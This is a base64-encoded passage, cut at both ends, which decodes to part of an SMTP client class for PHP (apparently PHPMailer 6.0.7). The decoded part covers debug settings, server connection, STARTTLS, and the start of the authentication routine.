UaGUgUEhQTWFpbGVyIFNNVFAgdmVyc2lvbiBudW1iZXIuCiAgICoKICAgKiBAdmFyIHN0cmluZwogICAqLwogIGNvbnN0IFZFUlNJT04gPSAnNi4wLjcnOwogIC8qKgogICAqIFNNVFAgbGluZSBicmVhayBjb25zdGFudC4KICAgKgogICAqIEB2YXIgc3RyaW5nCiAgICovCiAgY29uc3QgTEUgPSAiXHJcbiI7CiAgLyoqCiAgICogVGhlIFNNVFAgcG9ydCB0byB1c2UgaWYgb25lIGlzIG5vdCBzcGVjaWZpZWQuCiAgICoKICAgKiBAdmFyIGludAogICAqLwogIGNvbnN0IERFRkFVTFRfUE9SVCA9IDI1OwogIC8qKgogICAqIFRoZSBtYXhpbXVtIGxpbmUgbGVuZ3RoIGFsbG93ZWQgYnkgUkZDIDI4MjIgc2VjdGlvbiAyLjEuMS4KICAgKgogICAqIEB2YXIgaW50CiAgICovCiAgY29uc3QgTUFYX0xJTkVfTEVOR1RIID0gOTk4OwogIC8qKgogICAqIERlYnVnIGxldmVsIGZvciBubyBvdXRwdXQuCiAgICovCiAgY29uc3QgREVCVUdfT0ZGID0gMDsKICAvKioKICAgKiBEZWJ1ZyBsZXZlbCB0byBzaG93IGNsaWVudCAtPiBzZXJ2ZXIgbWVzc2FnZXMuCiAgICovCiAgY29uc3QgREVCVUdfQ0xJRU5UID0gMTsKICAvKioKICAgKiBEZWJ1ZyBsZXZlbCB0byBzaG93IGNsaWVudCAtPiBzZXJ2ZXIgYW5kIHNlcnZlciAtPiBjbGllbnQgbWVzc2FnZXMuCiAgICovCiAgY29uc3QgREVCVUdfU0VSVkVSID0gMjsKICAvKioKICAgKiBEZWJ1ZyBsZXZlbCB0byBzaG93IGNvbm5lY3Rpb24gc3RhdHVzLCBjbGllbnQgLT4gc2VydmVyIGFuZCBzZXJ2ZXIgLT4gY2xpZW50IG1lc3NhZ2VzLgogICAqLwogIGNvbnN0IERFQlVHX0NPTk5FQ1RJT04gPSAzOwogIC8qKgogICAqIERlYnVnIGxldmVsIHRvIHNob3cgYWxsIG1lc3NhZ2VzLgogICAqLwogIGNvbnN0IERFQlVHX0xPV0xFVkVMID0gNDsKICAvKioKICAgKiBEZWJ1ZyBvdXRwdXQgbGV2ZWwuCiAgICogT3B0aW9uczoKICAgKiAqIHNlbGY6OkRFQlVHX09GRiAoYDBgKSBObyBkZWJ1ZyBvdXRwdXQsIGRlZmF1bHQKICAgKiAqIHNlbGY6OkRFQlVHX0NMSUVOVCAoYDFgKSBDbGllbnQgY29tbWFuZHMKICAgKiAqIHNlbGY6OkRFQlVHX1NFUlZFUiAoYDJgKSBDbGllbnQgY29tbWFuZHMgYW5kIHNlcnZlciByZXNwb25zZXMKICAgKiAqIHNlbGY6OkRFQlVHX0NPTk5FQ1RJT04gKGAzYCkgQXMgREVCVUdfU0VSVkVSIHBsdXMgY29ubmVjdGlvbiBzdGF0dXMKICAgKiAqIHNlbGY6OkRFQlVHX0xPV0xFVkVMIChgNGApIExvdy1sZXZlbCBkYXRhIG91dHB1dCwgYWxsIG1lc3NhZ2VzLgogICAqCiAgICogQHZhciBpbnQKICAgKi8KICBwdWJsaWMgJGRvX2RlYnVnID0gc2VsZjo6REVCVUdfT0ZGOwogIC8qKgogICAqIEhvdyB0byBoYW5kbGUgZGVidWcgb3V0cHV0LgogICAqIE9wdGlvbnM6CiAgICogKiBgZWNob2AgT3V0cHV0IHBsYWluLXRleHQgYXMtaXMsIGFwcHJvcHJpYXRlIGZvciBDTEkKICAgKiAqIGBodG1sYCBPdXRwdXQgZXNjYXBlZCwgbGluZSBicmVha3MgY29udmVydGVkIHRvIGA8YnI+YCwgYXBwcm9wcmlhdGUgZm9yIGJyb3dzZXIgb3V0cHV0CiAgICogKiBgZXJyb3JfbG9nYCBPdXRwdXQgdG8gZXJyb3IgbG9nIGFzIGNvbmZpZ3VyZWQgaW4gcGhwLmluaQogICAqIEFsdGVybmF0aXZlbHksIHlvdSBjYW4gcHJvdmlkZSBhIGNhbGxhYmxlIGV4cGVjdGluZyB0d28gcGFyYW1zOiBhIG1lc3NhZ2Ugc3RyaW5nIGFuZCB0aGUgZGVidWcgbGV2ZWw6CiAgICoKICAgKiBgYGBwaHAKICAgKiAkc210cC0+RGVidWdvdXRwdXQgPSBmdW5jdGlvbigkc3RyLCAkbGV2ZWwpIHtlY2hvICJkZWJ1ZyBsZXZlbCAkbGV2ZWw7IG1lc3NhZ2U6ICRzdHIiO307CiAgICogYGBgCiAgICoKICAgKiBBbHRlcm5hdGl2ZWx5LCB5b3UgY2FuIHBhc3MgaW4gYW4gaW5zdGFuY2Ugb2YgYSBQU1ItMyBjb21wYXRpYmxlIGxvZ2dlciwgdGhvdWdoIG9ubHkgYGRlYnVnYAogICAqIGxldmVsIG91dHB1dCBpcyB1c2VkOgogICAqCiAgICogYGBgcGhwCiAgICogJG1haWwtPkRlYnVnb3V0cHV0ID0gbmV3IG15UHNyM0xvZ2dlcjsKICAgKiBgYGAKICAgKgogICAqIEB2YXIgc3RyaW5nfGNhbGxhYmxlfFxQc3JcTG9nXExvZ2dlckludGVyZmFjZQogICAqLwogIHB1YmxpYyAkRGVidWdvdXRwdXQgPSAnZWNobyc7CiAgLyoqCiAgICogV2hldGhlciB0byB1c2UgVkVSUC4KICAgKgogICAqIEBzZWUgaHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9WYXJpYWJsZV9lbnZlbG9wZV9yZXR1cm5fcGF0aAogICAqIEBzZWUgaHR0cDovL3d3dy5wb3N0Zml4Lm9yZy9WRVJQX1JFQURNRS5odG1sIEluZm8gb24gVkVSUAogICAqCiAgICogQHZhciBib29sCiAgICovCiAgcHVibGljICRkb192ZXJwID0gZmFsc2U7CiAgLyoqCiAgICogVGhlIHRpbWVvdXQgdmFsdWUgZm9yIGNvbm5lY3Rpb24sIGluIHNlY29uZHMuCiAgICogRGVmYXVsdCBvZiA1IG1pbnV0ZXMgKDMwMHNlYykgaXMgZnJvbSBSRkMyODIxIHNlY3Rpb24gNC41LjMuMi4KICAgKiBUaGlzIG5lZWRzIHRvIGJlIHF1aXRlIGhpZ2ggdG8gZnVuY3Rpb24gY29ycmVjdGx5IHdpdGggaG9zdHMgdXNpbmcgZ3JlZXRkZWxheSBhcyBhbiBhbnRpLXNwYW0gbWVhc3VyZS4KICAgKgogICAqIEBzZWUgaHR0cDovL3Rvb2xzLmlldGYub3JnL2h0bWwvcmZjMjgyMSNzZWN0aW9uLTQuNS4zLjIKICAgKgogICAqIEB2YXIgaW50CiAgICovCiAgcHVibGljICRUaW1lb3V0ID0gMzAwOwogIC8qKgogICAqIEhvdyBsb25nIHRvIHdhaXQgZm9yIGNvbW1hbmRzIHRvIGNvbXBsZXRlLCBpbiBzZWNvbmRzLgogICAqIERlZmF1bHQgb2YgNSBtaW51dGVzICgzMDBzZWMpIGlzIGZyb20gUkZDMjgyMSBzZWN0aW9uIDQuNS4zLjIuCiAgICoKICAgKiBAdmFyIGludAogICAqLwogIHB1YmxpYyAkVGltZWxpbWl0ID0gMzAwOwogIC8qKgogICAqIFBhdHRlcm5zIHRvIGV4dHJhY3QgYW4gU01UUCB0cmFuc2FjdGlvbiBpZCBmcm9tIHJlcGx5IHRvIGEgREFUQSBjb21tYW5kLgogICAqIFRoZSBmaXJzdCBjYXB0dXJlIGdyb3VwIGluIGVhY2ggcmVnZXggd2lsbCBiZSB1c2VkIGFzIHRoZSBJRC4KICAgKiBNUyBFU01UUCByZXR1cm5zIHRoZSBtZXNzYWdlIElELCB3aGljaCBtYXkgbm90IGJlIGNvcnJlY3QgZm9yIGludGVybmFsIHRyYWNraW5nLgogICAqCiAgICogQHZhciBzdHJpbmdbXQogICAqLwogIHByb3RlY3RlZCAkc210cF90cmFuc2FjdGlvbl9pZF9wYXR0ZXJucyA9IFsKICAgICdleGltJyA9PiAnL1tcZF17M30gT0sgaWQ9KC4qKS8nLAogICAgJ3NlbmRtYWlsJyA9PiAnL1tcZF17M30gMi4wLjAgKC4qKSBNZXNzYWdlLycsCiAgICAncG9zdGZpeCcgPT4gJy9bXGRdezN9IDIuMC4wIE9rOiBxdWV1ZWQgYXMgKC4qKS8nLAogICAgJ01pY3Jvc29mdF9FU01UUCcgPT4gJy9bMC05XXszfSAyLltcZF0uMCAoLiopQCg/Oi4qKSBRdWV1ZWQgbWFpbCBmb3IgZGVsaXZlcnkvJywKICAgICdBbWF6b25fU0VTJyA9PiAnL1tcZF17M30gT2sgKC4qKS8nLAogICAgJ1NlbmRHcmlkJyA9PiAnL1tcZF17M30gT2s6IHF1ZXVlZCBhcyAoLiopLycsCiAgICAnQ2FtcGFpZ25Nb25pdG9yJyA9PiAnL1tcZF17M30gMi4wLjAgT0s6KFthLXpBLVpcZF17NDh9KS8nLAogIF07CiAgLyoqCiAgICogVGhlIGxhc3QgdHJhbnNhY3Rpb24gSUQgaXNzdWVkIGluIHJlc3BvbnNlIHRvIGEgREFUQSBjb21tYW5kLAogICAqIGlmIG9uZSB3YXMgZGV0ZWN0ZWQuCiAgICoKICAgKiBAdmFyIHN0cmluZ3xib29sfG51bGwKICAgKi8KICBwcm90ZWN0ZWQgJGxhc3Rfc210cF90cmFuc2FjdGlvbl9pZDsKICAvKioKICAgKiBUaGUgc29ja2V0IGZvciB0aGUgc2VydmVyIGNvbm5lY3Rpb24uCiAgICoKICAgKiBAdmFyID9yZXNvdXJjZQogICAqLwogIHByb3RlY3RlZCAkc210cF9jb25uOwogIC8qKgogICAqIEVycm9yIGluZm9ybWF0aW9uLCBpZiBhbnksIGZvciB0aGUgbGFzdCBTTVRQIGNvbW1hbmQuCiAgICoKICAgKiBAdmFyIGFycmF5CiAgICovCiAgcHJvdGVjdGVkICRlcnJvciA9IFsKICAgICdlcnJvcicgPT4gJycsCiAgICAnZGV0YWlsJyA9PiAnJywKICAgICdzbXRwX2NvZGUnID0+ICcnLAogICAgJ3NtdHBfY29kZV9leCcgPT4gJycsCiAgXTsKICAvKioKICAgKiBUaGUgcmVwbHkgdGhlIHNlcnZlciBzZW50IHRvIHVzIGZvciBIRUxPLgogICAqIElmIG51bGwsIG5vIEhFTE8gc3RyaW5nIGhhcyB5ZXQgYmVlbiByZWNlaXZlZC4KICAgKgogICAqIEB2YXIgc3RyaW5nfG51bGwKICAgKi8KICBwcm90ZWN0ZWQgJGhlbG9fcnBseSA9IG51bGw7CiAgLyoqCiAgICogVGhlIHNldCBvZiBTTVRQIGV4dGVuc2lvbnMgc2VudCBpbiByZXBseSB0byBFSExPIGNvbW1hbmQuCiAgICogSW5kZXhlcyBvZiB0aGUgYXJyYXkgYXJlIGV4dGVuc2lvbiBuYW1lcy4KICAgKiBWYWx1ZSBhdCBpbmRleCAnSEVMTycgb3IgJ0VITE8nIChhY2NvcmRpbmcgdG8gY29tbWFuZCB0aGF0IHdhcyBzZW50KQogICAqIHJlcHJlc2VudHMgdGhlIHNlcnZlciBuYW1lLiBJbiBjYXNlIG9mIEhFTE8gaXQgaXMgdGhlIG9ubHkgZWxlbWVudCBvZiB0aGUgYXJyYXkuCiAgICogT3RoZXIgdmFsdWVzIGNhbiBiZSBib29sZWFuIFRSVUUgb3IgYW4gYXJyYXkgY29udGFpbmluZyBleHRlbnNpb24gb3B0aW9ucy4KICAgKiBJZiBudWxsLCBubyBIRUxPL0VITE8gc3RyaW5nIGhhcyB5ZXQgYmVlbiByZWNlaXZlZC4KICAgKgogICAqIEB2YXIgYXJyYXl8bnVsbAogICAqLwogIHByb3RlY3RlZCAkc2VydmVyX2NhcHMgPSBudWxsOwogIC8qKgogICAqIFRoZSBtb3N0IHJlY2VudCByZXBseSByZWNlaXZlZCBmcm9tIHRoZSBzZXJ2ZXIuCiAgICoKICAgKiBAdmFyIHN0cmluZwogICAqLwogIHByb3RlY3RlZCAkbGFzdF9yZXBseSA9ICcnOwogIC8qKgogICAqIE91dHB1dCBkZWJ1Z2dpbmcgaW5mbyB2aWEgYSB1c2VyLXNlbGVjdGVkIG1ldGhvZC4KICAgKgogICAqIEBwYXJhbSBzdHJpbmcgJHN0ciAgIERlYnVnIHN0cmluZyB0byBvdXRwdXQKICAgKiBAcGFyYW0gaW50ICAgICRsZXZlbCBUaGUgZGVidWcgbGV2ZWwgb2YgdGhpcyBtZXNzYWdlOyBzZWUgREVCVUdfKiBjb25zdGFudHMKICAgKgogICAqIEBzZWUgU01UUDo6JERlYnVnb3V0cHV0CiAgICogQHNlZSBTTVRQOjokZG9fZGVidWcKICAgKi8KICBwcm90ZWN0ZWQgZnVuY3Rpb24gZWRlYnVnKCRzdHIsICRsZXZlbCA9IDApCiAgewogICAgaWYgKCRsZXZlbCA+ICR0aGlzLT5kb19kZWJ1ZykgewogICAgICByZXR1cm47CiAgICB9CiAgICAvL0lzIHRoaXMgYSBQU1ItMyBsb2dnZXI/CiAgICBpZiAoJHRoaXMtPkRlYnVnb3V0cHV0IGluc3RhbmNlb2YgXFBzclxMb2dcTG9nZ2VySW50ZXJmYWNlKSB7CiAgICAgICR0aGlzLT5EZWJ1Z291dHB1dC0+ZGVidWcoJHN0cik7CiAgICAgIHJldHVybjsKICAgIH0KICAgIC8vQXZvaWQgY2xhc2ggd2l0aCBidWlsdC1pbiBmdW5jdGlvbiBuYW1lcwogICAgaWYgKCFpbl9hcnJheSgkdGhpcy0+RGVidWdvdXRwdXQsIFsnZXJyb3JfbG9nJywgJ2h0bWwnLCAnZWNobyddKSBhbmQgaXNfY2FsbGFibGUoJHRoaXMtPkRlYnVnb3V0cHV0KSkgewogICAgICBjYWxsX3VzZXJfZnVuYygkdGhpcy0+RGVidWdvdXRwdXQsICRzdHIsICRsZXZlbCk7CiAgICAgIHJldHVybjsKICAgIH0KICAgIHN3aXRjaCAoJHRoaXMtPkRlYnVnb3V0cHV0KSB7CiAgICAgIGNhc2UgJ2Vycm9yX2xvZyc6CiAgICAgICAgLy9Eb24ndCBvdXRwdXQsIGp1c3QgbG9nCiAgICAgICAgZXJyb3JfbG9nKCRzdHIpOwogICAgICAgIGJyZWFrOwogICAgICBjYXNlICdodG1sJzoKICAgICAgICAvL0NsZWFucyB1cCBvdXRwdXQgYSBiaXQgZm9yIGEgYmV0dGVyIGxvb2tpbmcsIEhUTUwtc2FmZSBvdXRwdXQKICAgICAgICBlY2hvIGdtZGF0ZSgnWS1tLWQgSDppOnMnKSwgJyAnLCBodG1sZW50aXRpZXMoCiAgICAgICAgICBwcmVnX3JlcGxhY2UoJy9bXHJcbl0rLycsICcnLCAkc3RyKSwKICAgICAgICAgIEVOVF9RVU9URVMsCiAgICAgICAgICAnVVRGLTgnCiAgICAgICAgKSwgIjxicj5cbiI7CiAgICAgICAgYnJlYWs7CiAgICAgIGNhc2UgJ2VjaG8nOgogICAgICBkZWZhdWx0OgogICAgICAgIC8vTm9ybWFsaXplIGxpbmUgYnJlYWtzCiAgICAgICAgJHN0ciA9IHByZWdfcmVwbGFjZSgnL1xyXG58XHIvbXMnLCAiXG4iLCAkc3RyKTsKICAgICAgICBlY2hvIGdtZGF0ZSgnWS1tLWQgSDppOnMnKSwKICAgICAgICAiXHQiLAogICAgICAgICAgLy9UcmltIHRyYWlsaW5nIHNwYWNlCiAgICAgICAgdHJpbSgKICAgICAgICAvL0luZGVudCBmb3IgcmVhZGFiaWxpdHksIGV4Y2VwdCBmb3IgdHJhaWxpbmcgYnJlYWsKICAgICAgICAgIHN0cl9yZXBsYWNlKAogICAgICAgICAgICAiXG4iLAogICAgICAgICAgICAiXG4gICAgICAgICAgICAgICAgICAgXHQgICAgICAgICAgICAgICAgICAiLAogICAgICAgICAgICB0cmltKCRzdHIpCiAgICAgICAgICApCiAgICAgICAgKSwKICAgICAgICAiXG4iOwogICAgfQogIH0KICAvKioKICAgKiBDb25uZWN0IHRvIGFuIFNNVFAgc2VydmVyLgogICAqCiAgICogQHBhcmFtIHN0cmluZyAkaG9zdCAgICBTTVRQIHNlcnZlciBJUCBvciBob3N0IG5hbWUKICAgKiBAcGFyYW0gaW50ICAgICRwb3J0ICAgIFRoZSBwb3J0IG51bWJlciB0byBjb25uZWN0IHRvCiAgICogQHBhcmFtIGludCAgICAkdGltZW91dCBIb3cgbG9uZyB0byB3YWl0IGZvciB0aGUgY29ubmVjdGlvbiB0byBvcGVuCiAgICogQHBhcmFtIGFycmF5ICAkb3B0aW9ucyBBbiBhcnJheSBvZiBvcHRpb25zIGZvciBzdHJlYW1fY29udGV4dF9jcmVhdGUoKQogICAqCiAgICogQHJldHVybiBib29sCiAgICovCiAgcHVibGljIGZ1bmN0aW9uIGNvbm5lY3QoJGhvc3QsICRwb3J0ID0gbnVsbCwgJHRpbWVvdXQgPSAzMCwgJG9wdGlvbnMgPSBbXSkKICB7CiAgICBzdGF0aWMgJHN0cmVhbW9rOwogICAgLy9UaGlzIGlzIGVuYWJsZWQgYnkgZGVmYXVsdCBzaW5jZSA1LjAuMCBidXQgc29tZSBwcm92aWRlcnMgZGlzYWJsZSBpdAogICAgLy9DaGVjayB0aGlzIG9uY2UgYW5kIGNhY2hlIHRoZSByZXN1bHQKICAgIGlmIChudWxsID09PSAkc3RyZWFtb2spIHsKICAgICAgJHN0cmVhbW9rID0gZnVuY3Rpb25fZXhpc3RzKCdzdHJlYW1fc29ja2V0X2NsaWVudCcpOwogICAgfQogICAgLy8gQ2xlYXIgZXJyb3JzIHRvIGF2b2lkIGNvbmZ1c2lvbgogICAgJHRoaXMtPnNldEVycm9yKCcnKTsKICAgIC8vIE1ha2Ugc3VyZSB3ZSBhcmUgX19ub3RfXyBjb25uZWN0ZWQKICAgIGlmICgkdGhpcy0+Y29ubmVjdGVkKCkpIHsKICAgICAgLy8gQWxyZWFkeSBjb25uZWN0ZWQsIGdlbmVyYXRlIGVycm9yCiAgICAgICR0aGlzLT5zZXRFcnJvcignQWxyZWFkeSBjb25uZWN0ZWQgdG8gYSBzZXJ2ZXInKTsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgaWYgKGVtcHR5KCRwb3J0KSkgewogICAgICAkcG9ydCA9IHNlbGY6OkRFRkFVTFRfUE9SVDsKICAgIH0KICAgIC8vIENvbm5lY3QgdG8gdGhlIFNNVFAgc2VydmVyCiAgICAkdGhpcy0+ZWRlYnVnKAogICAgICAiQ29ubmVjdGlvbjogb3BlbmluZyB0byAkaG9zdDokcG9ydCwgdGltZW91dD0kdGltZW91dCwgb3B0aW9ucz0iIC4KICAgICAgKGNvdW50KCRvcHRpb25zKSA+IDAgPyB2YXJfZXhwb3J0KCRvcHRpb25zLCB0cnVlKSA6ICdhcnJheSgpJyksCiAgICAgIHNlbGY6OkRFQlVHX0NPTk5FQ1RJT04KICAgICk7CiAgICAkZXJybm8gPSAwOwogICAgJGVycnN0ciA9ICcnOwogICAgaWYgKCRzdHJlYW1vaykgewogICAgICAkc29ja2V0X2NvbnRleHQgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoJG9wdGlvbnMpOwogICAgICBzZXRfZXJyb3JfaGFuZGxlcihbJHRoaXMsICdlcnJvckhhbmRsZXInXSk7CiAgICAgICR0aGlzLT5zbXRwX2Nvbm4gPSBzdHJlYW1fc29ja2V0X2NsaWVudCgKICAgICAgICAkaG9zdCAuICc6JyAuICRwb3J0LAogICAgICAgICRlcnJubywKICAgICAgICAkZXJyc3RyLAogICAgICAgICR0aW1lb3V0LAogICAgICAgIFNUUkVBTV9DTElFTlRfQ09OTkVDVCwKICAgICAgICAkc29ja2V0X2NvbnRleHQKICAgICAgKTsKICAgICAgcmVzdG9yZV9lcnJvcl9oYW5kbGVyKCk7CiAgICB9IGVsc2UgewogICAgICAvL0ZhbGwgYmFjayB0byBmc29ja29wZW4gd2hpY2ggc2hvdWxkIHdvcmsgaW4gbW9yZSBwbGFjZXMsIGJ1dCBpcyBtaXNzaW5nIHNvbWUgZmVhdHVyZXMKICAgICAgJHRoaXMtPmVkZWJ1ZygKICAgICAgICAnQ29ubmVjdGlvbjogc3RyZWFtX3NvY2tldF9jbGllbnQgbm90IGF2YWlsYWJsZSwgZmFsbGluZyBiYWNrIHRvIGZzb2Nrb3BlbicsCiAgICAgICAgc2VsZjo6REVCVUdfQ09OTkVDVElPTgogICAgICApOwogICAgICBzZXRfZXJyb3JfaGFuZGxlcihbJHRoaXMsICdlcnJvckhhbmRsZXInXSk7CiAgICAgICR0aGlzLT5zbXRwX2Nvbm4gPSBmc29ja29wZW4oCiAgICAgICAgJGhvc3QsCiAgICAgICAgJHBvcnQsCiAgICAgICAgJGVycm5vLAogICAgICAgICRlcnJzdHIsCiAgICAgICAgJHRpbWVvdXQKICAgICAgKTsKICAgICAgcmVzdG9yZV9lcnJvcl9oYW5kbGVyKCk7CiAgICB9CiAgICAvLyBWZXJpZnkgd2UgY29ubmVjdGVkIHByb3Blcmx5CiAgICBpZiAoIWlzX3Jlc291cmNlKCR0aGlzLT5zbXRwX2Nvbm4pKSB7CiAgICAgICR0aGlzLT5zZXRFcnJvcigKICAgICAgICAnRmFpbGVkIHRvIGNvbm5lY3QgdG8gc2VydmVyJywKICAgICAgICAnJywKICAgICAgICAoc3RyaW5nKSAkZXJybm8sCiAgICAgICAgKHN0cmluZykgJGVycnN0cgogICAgICApOwogICAgICAkdGhpcy0+ZWRlYnVnKAogICAgICAgICdTTVRQIEVSUk9SOiAnIC4gJHRoaXMtPmVycm9yWydlcnJvciddCiAgICAgICAgLiAiOiAkZXJyc3RyICgkZXJybm8pIiwKICAgICAgICBzZWxmOjpERUJVR19DTElFTlQKICAgICAgKTsKICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgJHRoaXMtPmVkZWJ1ZygnQ29ubmVjdGlvbjogb3BlbmVkJywgc2VsZjo6REVCVUdfQ09OTkVDVElPTik7CiAgICAvLyBTTVRQIHNlcnZlciBjYW4gdGFrZSBsb25nZXIgdG8gcmVzcG9uZCwgZ2l2ZSBsb25nZXIgdGltZW91dCBmb3IgZmlyc3QgcmVhZAogICAgLy8gV2luZG93cyBkb2VzIG5vdCBoYXZlIHN1cHBvcnQgZm9yIHRoaXMgdGltZW91dCBmdW5jdGlvbgogICAgaWYgKHN1YnN0cihQSFBfT1MsIDAsIDMpICE9ICdXSU4nKSB7CiAgICAgICRtYXggPSBpbmlfZ2V0KCdtYXhfZXhlY3V0aW9uX3RpbWUnKTsKICAgICAgLy8gRG9uJ3QgYm90aGVyIGlmIHVubGltaXRlZAogICAgICBpZiAoMCAhPSAkbWF4IGFuZCAkdGltZW91dCA+ICRtYXgpIHsKICAgICAgICBAc2V0X3RpbWVfbGltaXQoJHRpbWVvdXQpOwogICAgICB9CiAgICAgIHN0cmVhbV9zZXRfdGltZW91dCgkdGhpcy0+c210cF9jb25uLCAkdGltZW91dCwgMCk7CiAgICB9CiAgICAvLyBHZXQgYW55IGFubm91bmNlbWVudAogICAgJGFubm91bmNlID0gJHRoaXMtPmdldF9saW5lcygpOwogICAgJHRoaXMtPmVkZWJ1ZygnU0VSVkVSIC0+IENMSUVOVDogJyAuICRhbm5vdW5jZSwgc2VsZjo6REVCVUdfU0VSVkVSKTsKICAgIHJldHVybiB0cnVlOwogIH0KICAvKioKICAgKiBJbml0aWF0ZSBhIFRMUyAoZW5jcnlwdGVkKSBzZXNzaW9uLgogICAqCiAgICogQHJldHVybiBib29sCiAgICovCiAgcHVibGljIGZ1bmN0aW9uIHN0YXJ0VExTKCkKICB7CiAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnU1RBUlRUTFMnLCAnU1RBUlRUTFMnLCAyMjApKSB7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KICAgIC8vQWxsb3cgdGhlIGJlc3QgVExTIHZlcnNpb24ocykgd2UgY2FuCiAgICAkY3J5cHRvX21ldGhvZCA9IFNUUkVBTV9DUllQVE9fTUVUSE9EX1RMU19DTElFTlQ7CiAgICAvL1BIUCA1LjYuNyBkcm9wcGVkIGluY2x1c2lvbiBvZiBUTFMgMS4xIGFuZCAxLjIgaW4gU1RSRUFNX0NSWVBUT19NRVRIT0RfVExTX0NMSUVOVAogICAgLy9zbyBhZGQgdGhlbSBiYWNrIGluIG1hbnVhbGx5IGlmIHdlIGNhbgogICAgaWYgKGRlZmluZWQoJ1NUUkVBTV9DUllQVE9fTUVUSE9EX1RMU3YxXzJfQ0xJRU5UJykpIHsKICAgICAgJGNyeXB0b19tZXRob2QgfD0gU1RSRUFNX0NSWVBUT19NRVRIT0RfVExTdjFfMl9DTElFTlQ7CiAgICAgICRjcnlwdG9fbWV0aG9kIHw9IFNUUkVBTV9DUllQVE9fTUVUSE9EX1RMU3YxXzFfQ0xJRU5UOwogICAgfQogICAgLy8gQmVnaW4gZW5jcnlwdGVkIGNvbm5lY3Rpb24KICAgIHNldF9lcnJvcl9oYW5kbGVyKFskdGhpcywgJ2Vycm9ySGFuZGxlciddKTsKICAgICRjcnlwdG9fb2sgPSBzdHJlYW1fc29ja2V0X2VuYWJsZV9jcnlwdG8oCiAgICAgICR0aGlzLT5zbXRwX2Nvbm4sCiAgICAgIHRydWUsCiAgICAgICRjcnlwdG9fbWV0aG9kCiAgICApOwogICAgcmVzdG9yZV9lcnJvcl9oYW5kbGVyKCk7CiAgICByZXR1cm4gKGJvb2wpICRjcnlwdG9fb2s7CiAgfQogIC8qKgogICAqIFBlcmZvcm0gU01UUCBhdXRoZW50aWNhdGlvbi4KICAgKiBNdXN0IGJlIHJ1biBhZnRlciBoZWxsbygpLgogICAqCiAgICogQHNlZSAgICBoZWxsbygpCiAgICoKICAgKiBAcGFyYW0gc3RyaW5nICR1c2VybmFtZSBUaGUgdXNlciBuYW1lCiAgICogQHBhcmFtIHN0cmluZyAkcGFzc3dvcmQgVGhlIHBhc3N3b3JkCiAgICogQHBhcmFtIHN0cmluZyAkYXV0aHR5cGUgVGhlIGF1dGggdHlwZSAoQ1JBTS1NRDUsIFBMQUlOLCBMT0dJTiwgWE9BVVRIMikKICAgKiBAcGFyYW0gT0F1dGggICRPQXV0aCAgICBBbiBvcHRpb25hbCBPQXV0aCBpbnN0YW5jZSBmb3IgWE9BVVRIMiBhdXRoZW50aWNhdGlvbgogICAqCiAgICogQHJldHVybiBib29sIFRydWUgaWYgc3VjY2Vzc2Z1bGx5IGF1dGhlbnRpY2F0ZWQKICAgKi8KICBwdWJsaWMgZnVuY3Rpb24gYXV0aGVudGljYXRlKAogICAgJHVzZXJuYW1lLAogICAgJHBhc3N3b3JkLAogICAgJGF1dGh0eXBlID0gbnVsbCwKICAgICRPQXV0aCA9IG51bGwKICApIHsKICAgIGlmICghJHRoaXMtPnNlcnZlcl9jYXBzKSB7CiAgICAgICR0aGlzLT5zZXRFcnJvcignQXV0aGVudGljYXRpb24gaXMgbm90IGFsbG93ZWQgYmVmb3JlIEhFTE8vRUhMTycpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygnRUhMTycsICR0aGlzLT5zZXJ2ZXJfY2FwcykpIHsKICAgICAgLy8gU01UUCBleHRlbnNpb25zIGFyZSBhdmFpbGFibGU7IHRyeSB0byBmaW5kIGEgcHJvcGVyIGF1dGhlbnRpY2F0aW9uIG1ldGhvZAogICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoJ0FVVEgnLCAkdGhpcy0+c2VydmVyX2NhcHMpKSB7CiAgICAgICAgJHRoaXMtPnNldEVycm9yKCdBdXRoZW50aWNhdGlvbiBpcyBub3QgYWxsb3dlZCBhdCB0aGlzIHN0YWdlJyk7CiAgICAgICAgLy8gJ2F0IHRoaXMgc3RhZ2UnIG1lYW5zIHRoYXQgYXV0aCBtYXkgYmUgYWxsb3dlZCBhZnRlciB0aGUgc3RhZ2UgY2hhbmdlcwogICAgICAgIC8vIGUuZy4gYWZ0ZXIgU1RBUlRUTFMKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgIH0KICAgICAgJHRoaXMtPmVkZWJ1ZygnQXV0aCBtZXRob2QgcmVxdWVzdGVkOiAnIC4gKCRhdXRodHlwZSA/ICRhdXRodHlwZSA6ICdVTlNQRUNJRklFRCcpLCBzZWxmOjpERUJVR19MT1dMRVZFTCk7CiAgICAgICR0aGlzLT5lZGVidWcoCiAgICAgICAgJ0F1dGggbWV0aG9kcyBhdmFpbGFibGUgb24gdGhlIHNlcnZlcjogJyAuIGltcGxvZGUoJywnLCAkdGhpcy0+c2VydmVyX2NhcHNbJ0FVVEgnXSksCiAgICAgICAgc2VsZjo6REVCVUdfTE9XTEVWRUwKICAgICAgKTsKICAgICAgLy9JZiB3ZSBoYXZlIHJlcXVlc3RlZCBhIHNwZWNpZmljIGF1dGggdHlwZSwgY2hlY2sgdGhlIHNlcnZlciBzdXBwb3J0cyBpdCBiZWZvcmUgdHJ5aW5nIG90aGVycwogICAgICBpZiAobnVsbCAhPT0gJGF1dGh0eXBlIGFuZCAhaW5fYXJyYXkoJGF1dGh0eXBlLCAkdGhpcy0+c2VydmVyX2NhcHNbJ0FVVEgnXSkpIHsKICAgICAgICAkdGhpcy0+ZWRlYnVnKCdSZXF1ZXN0ZWQgYXV0aCBtZXRob2Qgbm90IGF2YWlsYWJsZTogJyAuICRhdXRodHlwZSwgc2VsZjo6REVCVUdfTE9XTEVWRUwpOwogICAgICAgICRhdXRodHlwZSA9IG51bGw7CiAgICAgIH0KICAgICAgaWYgKGVtcHR5KCRhdXRodHlwZSkpIHsKICAgICAgICAvL0lmIG5vIGF1dGggbWVjaGFuaXNtIGlzIHNwZWNpZmllZCwgYXR0ZW1wdCB0byB1c2UgdGhlc2UsIGluIHRoaXMgb3JkZXIKICAgICAgICAvL1RyeSBDUkFNLU1ENSBmaXJzdCBhcyBpdCdzIG1vcmUgc2V